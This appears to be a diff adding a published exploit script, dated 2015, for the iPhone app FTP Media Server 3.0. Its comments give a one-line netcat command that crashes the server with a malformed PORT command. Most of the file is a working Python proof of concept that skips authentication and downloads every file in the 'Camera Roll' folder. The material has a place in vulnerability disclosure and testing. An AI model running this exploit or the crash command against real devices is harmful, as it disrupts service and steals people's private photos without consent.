@@ -1,0 +1,70 @@
+#!/usr/bin/env python
+#==================================================================================
+# Exploit Title: FTP Media Server 3.0 - Authentication Bypass and Denial of Service
+# Date: 2015-05-25
+# Exploit Author: Wh1t3Rh1n0 (Michael Allen)
+# Exploit Author's Homepage: http://www.mikeallen.org
+# Software Link: https://itunes.apple.com/us/app/ftp-media-server-free/id528962302
+# Version: 3.0
+# Tested on: iPhone
+#==================================================================================
+# ------------------
+# Denial of Service:
+# ------------------
+# The FTP server does not properly handle errors raised by invalid 
+# FTP commands. The following command, which sends an invalid PORT command to 
+# the FTP server, will crash the server once it is received.
+
+# echo -en "PORT\r\n" | nc -nv 192.168.2.5 50000
+
+# ----------------------
+# Authentication Bypass:
+# ----------------------
+# The FTP server does not handle unauthenticated connections or incorrect login
+# credentials properly. A remote user can issue commands to the FTP server 
+# without authenticating or after entering incorrect credentials.
+
+# The following proof-of-concept connects to the given FTP server and 
+# downloads all files stored in the "Camera Roll" folder without providing a
+# username or password:
+
+import sys
+from ftplib import FTP
+
+if len(sys.argv) <= 1:
+    print "Usage: ./ftp-nologin.py [host] [port]"
+    exit()
+
+host = sys.argv[1]    
+port = int(sys.argv[2])
+
+files = []
+
+def append_file(s):
+    files.append(s.split(' ')[-1])
+
+blocks = []
+def get_blocks(d):
+    blocks.append(d)
+
+ftp = FTP()
+print ftp.connect(host, port)
+ftp.set_pasv(1)
+ftp.cwd("Camera Roll")
+print ftp.retrlines('LIST', append_file)
+
+files.pop(0)
+
+for filename in files:
+    print "Downloading %s..." % filename
+    ftp.retrbinary('RETR /Camera Roll/' + filename, get_blocks)
+
+    f = open(filename, 'wb')
+    for block in blocks:
+        f.write(block)
+    f.close()
+    print "[+] File saved to: %s" % filename
+    
+    blocks = []
+
+ftp.quit()
